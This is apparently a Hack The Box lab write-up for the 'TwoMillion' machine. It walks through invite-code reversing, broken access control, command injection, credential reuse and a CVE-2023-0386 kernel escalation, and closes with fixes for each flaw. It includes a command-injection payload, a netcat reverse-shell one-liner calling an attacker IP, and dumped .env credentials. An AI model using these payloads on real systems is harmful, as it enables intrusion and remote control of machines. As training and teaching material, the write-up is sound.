## Summary

TwoMillion is an Easy Linux machine based on the old HTB invite flow. The
client-side invite logic is reversed to register an account, then a **Broken
Access Control** flaw on `/api/v1/admin/settings/update` promotes the account to
admin. An admin-only VPN endpoint is vulnerable to **command injection**,
yielding a shell as `www-data`. Credentials in a `.env` file allow SSH as
`admin`, and the **CVE-2023-0386** OverlayFS/FUSE kernel bug escalates to
**root**.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| TwoMillion | Easy | Linux | Hack The Box |

## Attack Path

1. Web application on port 80 with exposed `/api/v1/` endpoints.
2. Reverse the client-side invite-code logic to register.
3. Broken Access Control promotes the account to admin.
4. Command injection on the admin VPN endpoint gives a shell.
5. Credentials exposed in a `.env` file allow SSH as `admin`.
6. Privilege escalation via CVE-2023-0386.

## Reconnaissance

Initial enumeration was performed with **Nmap**.

```bash
nmap -sC -sV -A -T4 10.129.27.255
```

| Port | Service | Notes |
| --- | --- | --- |
| 22 | SSH | OpenSSH 8.9p1 Ubuntu |
| 80 | HTTP | nginx, app at 2million.htb |

## Web Enumeration

The site used an invite-based registration flow. The `/invite` route loaded an
obfuscated JavaScript file (`inviteapi.min.js`) containing a
`makeInviteCode()` function. Deobfuscating it revealed the invite API logic.

```
/api/v1/invite/how/to/generate
```

The endpoint returned an encoded message; after ROT13 and Base64 decoding it
pointed to the code used to register an account.

## Exploitation — Broken Access Control

After registering and logging in, manual enumeration revealed administrative
endpoints under `/api/v1/admin`. The `/api/v1/admin/settings/update` endpoint
allowed changing account properties, including the admin flag, without proper
authorization. Sending the correct JSON body promoted the account to admin.

This is a classic **Broken Access Control** flaw.

## Command Injection

With admin privileges, the `/api/v1/admin/vpn/generate` endpoint was reachable
and vulnerable to **command injection**.

```
ninjaa;id;
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A reverse shell payload was injected:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.233 1337 >/tmp/f
```

## Initial Access (User)

A listener received the shell as `www-data`.

```bash
nc -nlvp 1337
```

Local enumeration found a `.env` file with database credentials:

```bash
cat .env
```

```
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

These were reused to authenticate over SSH as `admin`:

```bash
ssh admin@2million.htb
```

The user flag lives at `/home/admin/user.txt`.

## Privilege Escalation

### Enumeration

A mail in `admin`'s mailbox referenced upcoming kernel patches for an
OverlayFS/FUSE vulnerability.

```bash
cat /var/mail/admin
```

This pointed directly at **CVE-2023-0386**.

### Exploiting CVE-2023-0386

The exploit was transferred to the target and run, producing a root shell.

```bash
# attacker
python3 -m http.server 8000
```

The root flag lives at `/root/root.txt`.

## Vulnerability Analysis

**Sensitive logic exposed in JavaScript** — the invite-generation logic was
reachable client-side (even if obfuscated), allowing the registration flow to be
reconstructed. Fix: keep security-sensitive logic server-side and never rely on
client-side obfuscation.

**Broken Access Control** — `/api/v1/admin/settings/update` allowed promoting a
regular account to admin without authorization. Fix: enforce server-side
authorization checks on every privileged action.

**Command injection** — `/api/v1/admin/vpn/generate` accepted unsanitized input,
giving RCE as `www-data`. Fix: avoid shelling out with user input; use safe APIs
and strict input validation.

**Credential exposure** — a `.env` file held reusable credentials valid for SSH.
Fix: restrict permissions on environment files and avoid credential reuse.

**Kernel vulnerability (CVE-2023-0386)** — an OverlayFS/FUSE bug allowed
escalation from `admin` to root. Fix: keep the kernel patched.

## Tools Used

- Nmap
- Burp Suite
- CyberChef
- Netcat
- SSH
- Python HTTP server

## Key Takeaways

- Obfuscated JavaScript can still expose critical application flows.
- Poorly protected APIs often hide serious authorization flaws.
- Command injection remains extremely impactful.
- Exposed `.env` files are a high operational risk.
- Internal artifacts like mail can provide valuable privesc leads.
